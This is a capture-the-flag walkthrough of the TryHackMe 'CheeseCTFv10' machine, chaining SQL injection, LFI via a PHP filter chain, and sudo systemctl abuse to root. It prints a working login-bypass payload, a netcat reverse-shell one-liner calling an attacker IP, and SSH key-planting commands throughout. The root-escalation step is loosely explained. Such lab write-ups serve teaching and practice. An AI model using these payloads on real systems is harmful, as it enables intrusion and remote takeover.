# TryHackMe — CheeseCTFv10 | Linux Machine Walkthrough

## Introduction

Today we are back with another TryHackMe CTF, this time solving the **CheeseCTFv10** machine from the easy category.

The target is a Linux-based machine and we were provided with the following IP:

    10.49.140.72

The complete attack chain for this machine was:

**Nmap → Web Enumeration → SQL Injection → LFI → PHP Filter Chain → Reverse Shell → Writable SSH Key → SSH as comte → Systemd Timer → Root SSH Access**

---

# 1. Target Information

Target IP:

    10.49.140.72

We begin with a full TCP port scan.

    nmap -p- --min-rate 5000 -T4 10.49.140.72

The scan returned:

    Nmap scan report for ip-10-49-140-72.ap-south-1.compute.internal (10.49.140.72)
    Host is up, received user-set (0.00029s latency).

    PORT     STATE SERVICE       REASON
    21/tcp   open  ftp           syn-ack ttl 64
    22/tcp   open  ssh           syn-ack ttl 64
    23/tcp   open  telnet        syn-ack ttl 64
    25/tcp   open  smtp          syn-ack ttl 64
    80/tcp   open  http          syn-ack ttl 64
    110/tcp  open  pop3          syn-ack ttl 64
    139/tcp  open  netbios-ssn   syn-ack ttl 64
    443/tcp  open  https         syn-ack ttl 64
    445/tcp  open  microsoft-ds  syn-ack ttl 64
    3389/tcp open  ms-wbt-server syn-ack ttl 64

A large number of ports appeared open during the initial scan, so instead of blindly enumerating every service immediately, we focused on the services that were most relevant to the initial attack surface.

![Nmap All Ports](URL 1)

---

# 2. Service and Version Detection

We started with the main web and SSH services:

    nmap -sC -sV -p 22,80 10.49.140.72

The result:

    Nmap scan report for 10.49.140.72
    Host is up (0.060s latency).

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-methods:
    |_  Supported Methods: GET POST OPTIONS HEAD
    |_http-title: The Cheese Shop

    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

The important services were:

    22/tcp  SSH
    80/tcp  HTTP

The web server was running Apache 2.4.41 on Ubuntu.

![Service and Version Scan](URL 2)

---

# 3. Web Enumeration

Opening the web application in Burp Suite/browser revealed a website named:

    The Cheese Shop

![The Cheese Shop](URL 3)

We then performed directory enumeration using Gobuster.

    gobuster dir -u http://10.49.140.72 -w /usr/share/seclists/Discovery/Web-Content/common.txt

The enumeration returned several interesting files:

    /index.html           (Status: 200) [Size: 1759]
    /login.php            (Status: 200) [Size: 834]
    /.htaccess            (Status: 403) [Size: 277]
    /style.css            (Status: 200) [Size: 705]
    /users.html           (Status: 200) [Size: 377]
    /orders.html          (Status: 200) [Size: 380]
    /messages.html        (Status: 200) [Size: 380]

Among these, the most interesting files were:

    /login.php
    /users.html
    /orders.html
    /messages.html

![Gobuster Enumeration](URL 4)

---

# 4. Discovering the LFI Functionality

We started investigating the discovered web pages.

The `messages.html` page contained an interesting clue.

![Messages Page](URL 5)

Following the functionality led us to:

    http://10.49.140.72/secret-script.php?file=php://filter/resource=supersecretmessageforadmin

The presence of the `file` parameter immediately suggested that the application might be reading files from the filesystem.

This is a common indicator of a potential **Local File Inclusion (LFI)** vulnerability.

We tested a direct file inclusion attempt:

    http://10.49.140.72/secret-script.php?file=/etc/passwd

This successfully demonstrated that the application could be abused to read local files.

![LFI](URL 6)

At this point, we had identified an LFI vulnerability.

However, simply reading files was not enough.

The interesting part was that the application accepted PHP stream wrappers, including:

    php://filter

This opened the possibility of turning the LFI into code execution.

---

# 5. SQL Injection on the Login Page

Before exploiting the PHP filter functionality, we also investigated the login page.

    http://10.49.140.72/login.php

![Login Page](URL 7)

We tested the login functionality with SQL injection payloads.

One of the payloads used was:

    ' OR 'x'='x'#

The application accepted the payload and allowed us to bypass the login.

This gave us access to the dashboard.

![SQL Injection Login Bypass](URL 8)

The SQL injection was another important vulnerability discovered during enumeration.

---

# 6. PHP Filter Chain

The LFI endpoint was especially interesting because it supported the PHP filter wrapper.

The vulnerable functionality was:

    /secret-script.php?file=

Normally, an LFI allows us to read local files.

However, PHP filters can sometimes be abused to construct a PHP payload through a filter chain and achieve code execution.

For this, we used the following tool:

    php_filter_chain_generator

The project used was:

    https://github.com/synacktiv/php_filter_chain_generator

We generated a PHP filter chain containing a reverse shell payload.

The command used was:

    python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.158.30 4444 >/tmp/f"); ?>' | grep '^php' > payload.txt

This generated the required PHP filter-chain payload.

---

# 7. Starting the Listener

Before triggering the payload, we started a Netcat listener on our attacking machine:

    nc -lvnp 4444

The listener was waiting for a connection:

    listening on [any] 4444 ...

The attacker IP used in the payload was:

    192.168.158.30

---

# 8. Triggering the PHP Filter Chain

After generating the payload, we sent it to the vulnerable `secret-script.php` endpoint.

The command used was:

    curl -s "http://10.49.140.72/secret-script.php?file=$(cat payload.txt)"

The PHP filter chain was processed by the application and eventually executed our PHP payload.

The reverse shell connected back to our listener.

The result:

    connect to [192.168.158.30] from (UNKNOWN) [10.49.140.72] 56838

    sh: 0: can't access tty; job control turned off

    $

We had obtained a shell as:

    www-data

![Reverse Shell](URL 9)

---

# 9. Stabilizing the Shell

The initial shell was a basic non-interactive shell.

We checked whether Python 3 was available:

    which python3

The target returned:

    /usr/bin/python3

We then spawned a proper Bash PTY:

    python3 -c 'import pty; pty.spawn("/bin/bash")'

The shell changed to:

    www-data@ip-10-49-140-72:/var/www/html$

On the attacker machine, we suspended the Netcat listener:

    CTRL+Z

Then:

    stty raw -echo

And brought the listener back:

    fg

Finally:

    export TERM=xterm

We now had a much more usable interactive shell.

![Stabilized Shell](URL 10)

---

# 10. Searching for Writable Files

With our initial foothold established, we started local enumeration.

One useful check was to search for files writable by our current user:

    find / -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'

The result included:

    /home/comte/.ssh/authorized_keys
    /etc/systemd/system/exploit.timer

Two files immediately stood out:

    /home/comte/.ssh/authorized_keys

and:

    /etc/systemd/system/exploit.timer

The writable SSH `authorized_keys` file provided a direct opportunity to move from `www-data` to the `comte` account.

The writable systemd timer would become important later during privilege escalation.

---

# 11. Adding Our SSH Key for comte

We already had an SSH key pair on our attacking machine.

We placed our public key into the writable `authorized_keys` file.

The command used on the target was:

    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZ2zaqxvzxlvNAY7TVe+UmASA8HQmjskexTRrQNnwam root@kali' > /home/comte/.ssh/authorized_keys

This replaced the contents of `authorized_keys` with our public key.

Now we could authenticate to the `comte` account using the corresponding private key.

---

# 12. SSH as comte

From our attacking machine, we connected using our private key:

    ssh -i ed_ed25519 comte@10.49.140.72

The SSH connection succeeded.

We were now:

    comte

We checked the home directory:

    ls

The output included:

    snap
    user.txt

We then read the user flag:

    cat user.txt

![User Shell](URL 11)

At this point, the initial user-level objective was complete.

Now it was time for privilege escalation.

---

# 13. Privilege Escalation Enumeration

We checked the sudo permissions of the `comte` user:

    sudo -l

The result was:

    User comte may run the following commands on ip-10-49-140-72:
        (ALL) NOPASSWD: /bin/systemctl daemon-reload
        (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
        (ALL) NOPASSWD: /bin/systemctl start exploit.timer
        (ALL) NOPASSWD: /bin/systemctl enable exploit.timer

This was highly interesting.

The user could execute several `systemctl` commands as root without a password.

Even more importantly, earlier enumeration had already revealed:

    /etc/systemd/system/exploit.timer

So we investigated the timer.

---

# 14. Inspecting exploit.timer

We read the timer configuration:

    cat /etc/systemd/system/exploit.timer

The contents were:

    [Unit]
    Description=Exploit Timer

    [Timer]
    OnBootSec=5s

    [Install]
    WantedBy=timers.target

The timer was configured to trigger:

    exploit.service

The important relationship was:

    exploit.timer
          |
          v
    exploit.service

Because `comte` had permission to start/restart the timer through `sudo`, this became our privilege escalation path.

![Systemd Timer](URL 12)

---

# 15. Reloading and Starting the Timer

After inspecting the timer, we reloaded systemd:

    sudo /bin/systemctl daemon-reload

Then started the timer:

    sudo /bin/systemctl start exploit.timer

We checked its status:

    systemctl status exploit.timer

The result showed:

    ● exploit.timer - Exploit Timer
         Loaded: loaded (/etc/systemd/system/exploit.timer; disabled; vendor preset: enabled)
         Active: active (elapsed)
         Triggers: ● exploit.service

The important part was:

    Triggers: ● exploit.service

The timer was active and configured to execute the associated service.

---

# 16. Investigating the Exploit Path

During the enumeration, another interesting binary was discovered:

    /opt/xxd

This binary was being used by the service to process data.

The payload we used was an SSH public key:

    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZ2zaqxvzxlvNAY7TVe+UmASA8HQmjskexTRrQNnwam root@kali

The command executed through the service was:

    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZ2zaqxvzxlvNAY7TVe+UmASA8HQmjskexTRrQNnwam root@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys

The purpose of this command is to place our SSH public key into:

    /root/.ssh/authorized_keys

Because the associated systemd service executes with root privileges, the resulting file modification occurs as root.

This gives us a way to authenticate directly to the root account through SSH.

---

# 17. Obtaining Root SSH Access

After the systemd timer triggered the associated service and our public key was placed into the root SSH configuration, we could authenticate using our private key.

The command was:

    ssh -i ed_ed25519 root@10.49.140.72

The connection succeeded.

We were now logged in as:

    root

We can verify the privileges with:

    id

The expected result confirms:

    uid=0(root)

![Root SSH Shell](URL 13)

---

# 18. Reading the Root Flag

Now that we have root access, we move into the root home directory:

    cd /root

List the contents:

    ls

The directory contains:

    root.txt
    snap

Finally:

    cat root.txt

This gives us the final root flag.

![Root Flag](URL 14)

---

# 19. Complete Attack Chain

    Target
      |
      v
    10.49.140.72
      |
      v
    Nmap Enumeration
      |
      v
    Apache Web Server
      |
      +-----------------------------+
      |                             |
      v                             v
    Gobuster                    login.php
      |                             |
      v                             v
    messages.html              SQL Injection
      |                             |
      v                             v
    secret-script.php          Dashboard
      |
      v
    LFI
      |
      v
    php://filter
      |
      v
    PHP Filter Chain Generator
      |
      v
    Reverse Shell
      |
      v
    www-data
      |
      v
    Writable Files Enumeration
      |
      +-----------------------------+
      |                             |
      v                             v
    comte SSH Key             exploit.timer
      |                             |
      v                             v
    SSH as comte               sudo systemctl
      |                             |
      |                             v
      |                       exploit.service
      |                             |
      |                             v
      |                      /root/.ssh/authorized_keys
      |                             |
      +-------------+---------------+
                    |
                    v
                SSH as root
                    |
                    v
                  root.txt

---

# 20. Key Vulnerabilities

## SQL Injection

The login functionality was vulnerable to SQL injection.

Example payload:

    ' OR 'x'='x'#

This allowed authentication bypass.

## Local File Inclusion

The application accepted a user-controlled `file` parameter:

    /secret-script.php?file=

This allowed local files such as `/etc/passwd` to be read.

## PHP Filter Chain Code Execution

The application supported PHP stream wrappers such as:

    php://filter

By generating a PHP filter chain, the LFI could be escalated to arbitrary PHP code execution and eventually a reverse shell.

## Writable SSH authorized_keys

The following file was writable:

    /home/comte/.ssh/authorized_keys

This allowed us to insert our own SSH public key and authenticate as `comte`.

## Dangerous Systemd Configuration

The `comte` user could execute:

    sudo /bin/systemctl daemon-reload
    sudo /bin/systemctl start exploit.timer
    sudo /bin/systemctl restart exploit.timer
    sudo /bin/systemctl enable exploit.timer

The timer triggered:

    exploit.service

The service provided the path to modify:

    /root/.ssh/authorized_keys

This resulted in root SSH access.

---

# 21. Commands Used

## Full Port Scan

    nmap -p- --min-rate 5000 -T4 10.49.140.72

## Service Detection

    nmap -sC -sV -p 22,80 10.49.140.72

## Directory Enumeration

    gobuster dir -u http://10.49.140.72 -w /usr/share/seclists/Discovery/Web-Content/common.txt

## SQL Injection

    ' OR 'x'='x'#

## LFI Test

    http://10.49.140.72/secret-script.php?file=/etc/passwd

## Generate PHP Filter Chain

    python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.158.30 4444 >/tmp/f"); ?>' | grep '^php' > payload.txt

## Trigger Payload

    curl -s "http://10.49.140.72/secret-script.php?file=$(cat payload.txt)"

## Start Listener

    nc -lvnp 4444

## Spawn PTY

    python3 -c 'import pty; pty.spawn("/bin/bash")'

## Stabilize Shell

    stty raw -echo
    fg
    export TERM=xterm

## Find Writable Files

    find / -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'

## Add SSH Key for comte

    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINZ2zaqxvzxlvNAY7TVe+UmASA8HQmjskexTRrQNnwam root@kali' > /home/comte/.ssh/authorized_keys

## SSH as comte

    ssh -i ed_ed25519 comte@10.49.140.72

## Check Sudo Permissions

    sudo -l

## Inspect Timer

    cat /etc/systemd/system/exploit.timer

## Reload Systemd

    sudo /bin/systemctl daemon-reload

## Start Timer

    sudo /bin/systemctl start exploit.timer

## Check Timer

    systemctl status exploit.timer

## Root SSH Access

    ssh -i ed_ed25519 root@10.49.140.72

## Verify Root

    id

## Read Root Flag

    cd /root
    ls
    cat root.txt

---

# 22. Final Attack Path

The entire machine was compromised through a chain of multiple vulnerabilities and misconfigurations:

    SQL Injection
          ↓
    Authentication Bypass
          ↓
    LFI
          ↓
    PHP Filter Chain
          ↓
    Remote Code Execution
          ↓
    Reverse Shell as www-data
          ↓
    Writable /home/comte/.ssh/authorized_keys
          ↓
    SSH as comte
          ↓
    Sudo systemctl Permissions
          ↓
    exploit.timer
          ↓
    exploit.service
          ↓
    Write /root/.ssh/authorized_keys
          ↓
    SSH as root
          ↓
    Root Flag

---

# 23. Final Summary

**CheeseCTFv10** was a good example of how several individually interesting weaknesses can be chained together to achieve full system compromise.

The initial enumeration exposed the web application running on Apache.

Web enumeration revealed multiple pages, including `messages.html` and `login.php`.

The login page was vulnerable to SQL injection, while `secret-script.php` exposed a Local File Inclusion vulnerability through the `file` parameter.

Because the LFI supported the `php://filter` wrapper, we were able to use the PHP filter chain generator to construct a payload that executed a reverse shell.

This provided our initial foothold as:

    www-data

Local enumeration then revealed that:

    /home/comte/.ssh/authorized_keys

was writable.

By adding our SSH public key, we obtained SSH access as:

    comte

The `comte` account had passwordless sudo permissions for several `systemctl` operations involving:

    exploit.timer

The timer triggered:

    exploit.service

which provided the final privilege escalation path by writing our SSH public key into:

    /root/.ssh/authorized_keys

We then authenticated directly as root using our private SSH key.

The final attack chain was:

    SQL Injection
        ↓
    LFI
        ↓
    PHP Filter Chain
        ↓
    Reverse Shell
        ↓
    www-data
        ↓
    Writable SSH Key
        ↓
    comte
        ↓
    Systemd Timer
        ↓
    exploit.service
        ↓
    Root SSH Key
        ↓
    root

**Machine Pwned.**
